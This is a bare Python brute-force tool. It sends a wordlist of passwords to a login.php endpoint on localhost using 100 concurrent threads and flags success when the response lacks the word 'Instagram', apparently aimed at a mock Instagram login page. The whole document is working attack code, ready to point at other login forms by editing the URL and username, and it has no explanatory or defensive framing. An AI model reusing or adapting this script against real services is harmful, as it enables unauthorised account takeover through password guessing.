import requests
from concurrent.futures import ThreadPoolExecutor
import time

URL = "http://127.0.0.1:8000/backend/login.php"  # your local server URL
USERNAME = "testuser"
WORDLIST_FILE = "wordlist.txt"
MAX_THREADS = 100

def try_password(password):
    data = {"username": USERNAME, "password": password.strip()}
    try:
        r = requests.post(URL, data=data, timeout=5)
        if "Instagram" not in r.text:  # Simple heuristic: if no Instagram in response, maybe login success
            print(f"[+] Password found: {password}")
            return True
    except Exception as e:
        pass
    return False

def main():
    with open(WORDLIST_FILE) as f:
        passwords = f.readlines()

    start = time.time()
    found = False
    with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
        futures = []
        for pwd in passwords:
            futures.append(executor.submit(try_password, pwd))
        for future in futures:
            if future.result():
                found = True
                break
    end = time.time()
    print(f"Time taken: {end - start:.2f} seconds")

if __name__ == "__main__":
    main()
